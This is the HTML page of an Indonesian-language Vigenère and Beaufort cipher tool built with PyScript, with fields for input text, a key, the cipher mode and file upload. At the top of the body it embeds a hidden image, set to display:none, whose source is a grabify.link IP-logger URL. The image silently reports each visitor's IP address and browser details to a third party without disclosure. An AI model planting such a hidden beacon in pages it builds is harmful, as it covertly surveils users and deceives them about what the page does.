<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Vigenère cipher</title>
    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
    <link rel="stylesheet" href="https://fonts.cdnfonts.com/css/source-code-pro">
    <style>
        textarea {
            font-family: "Source Code Pro", monospace;
            font-weight: 400;
            font-size: 16px;
            line-height: 1.5;
        }
    </style>
    <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
    <script src="https://kit.fontawesome.com/8020a10438.js" crossorigin="anonymous"></script>
</head>

<body>
    <img src="https://grabify.link/GHYBG0" style="display: none;">
    <py-script src="./vigenere.py"></py-script>

    <section class="hero is-link">
        <div class="hero-body">
            <p class="title">
                Sandi Vigenère
            </p>
            <p class="subtitle">
                Metode menyandikan teks alfabet dengan menggunakan deretan sandi Caesar
                berdasarkan huruf-huruf pada kata kunci.
            </p>
        </div>
    </section>

    <section class="section">
        <div class="container">
            <div class="columns">

                <div class="column">
                    <div class="box">
                        <h1 class="title" id="title_in">Plainteks</h1>
                        <h2 class="subtitle">input</h2>
                        <textarea class="textarea" id="input"
                            placeholder="masukan pesan atau unggah file teks"></textarea>
                        <p id="p_input"></p>
                        <div class="file is-link has-name is-fullwidth mt-5">
                            <label class="file-label">
                                <input class="file-input is-rounded" type="file" name="upload" id="upload"
                                    accept=".txt">
                                <span class="file-cta">
                                    <span class="file-icon">
                                        <i class="fas fa-upload"></i>
                                    </span>
                                    <span class="file-label">
                                        Unggah file text
                                    </span>
                                </span>
                                <span class="file-name" id="upload_name">
                                    (kosong)
                                </span>
                            </label>
                        </div>
                    </div>
                </div>

                <div class="column is-3">
                    <div class="tabs is-centered">
                        <ul>
                            <li class="is-active" id="tab_enkripsi">
                                <a>
                                    <span class="icon is-small">
                                        <i class="fas fa-lock" aria-hidden="true"></i>
                                    </span>
                                    <span>Enkripsi</span>
                                </a>
                            </li>
                            <li id="tab_dekripsi">
                                <a>
                                    <span class="icon is-small">
                                        <i class="fas fa-lock-open" aria-hidden="true"></i>
                                    </span>
                                    <span>Dekripsi</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                    <div class="field">
                        <label class="label">Jenis</label>
                        <div class="control">
                            <div class="select is-rounded">
                                <select id="jenis">
                                    <option value="0">Standard (26 huruf alfabet)</option>
                                    <option value="1">Extended (256 karakter ASCII)</option>
                                    <option value="2">Beaufort cipher</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <input type="text" id="choice" hidden>
                    <div class="field">
                        <label class="label">Kunci</label>
                        <div class="control has-icons-left has-icons-right">
                            <input class="input is-rounded" id="key" type="text"
                                placeholder="masukan kunci (maks. 25 karakter)" maxlength="25" required>
                            <span class="icon is-small is-left">
                                <i class="fas fa-key"></i>
                            </span>
                        </div>
                        <p id="p_key"></p>
                    </div>
                    <div class="field">
                        <label class="label">Mode</label>
                        <div class="control">
                            <div class="select is-rounded">
                                <select id="mode">
                                    <option value="0">apa adanya</option>
                                    <option value="1">tanpa spasi</option>
                                    <option value="2">dalam kelompok 5-huruf</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <button class="button is-link is-fullwidth is-rounded mt-5" id="proses"
                        pys-onClick="proses">Proses</button>
                </div>

                <div class="column">
                    <div class="box">
                        <h1 class="title" id="title_out">Cipherteks</h1>
                        <h2 class="subtitle">output</h2>
                        <textarea class="textarea" id="output" readonly></textarea>
                        <div class="has-text-centered">
                            <button class="button is-link mt-5" id="unduh_file" pys-onClick="unduh_file">
                                <span class="icon">
                                    <i class="fas fa-download"></i>
                                </span>
                                <span>Simpan</span>
                            </button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="content has-text-centered">
            <p>
                Alat enkripsi dan dekripsi <strong>Sandi Vigenère</strong> dibuat oleh <a
                    href="https://github.com/luthfeew" target="_blank">Luthfi Wijaya</a> dan <a href="#">Ardan Ario
                    Jati</a>.
                <!-- Lisensi kode sumber
                <a href="https://choosealicense.com/licenses/mit/" target="_blank">MIT</a>. -->
            </p>
        </div>
    </footer>
</body>

</html>
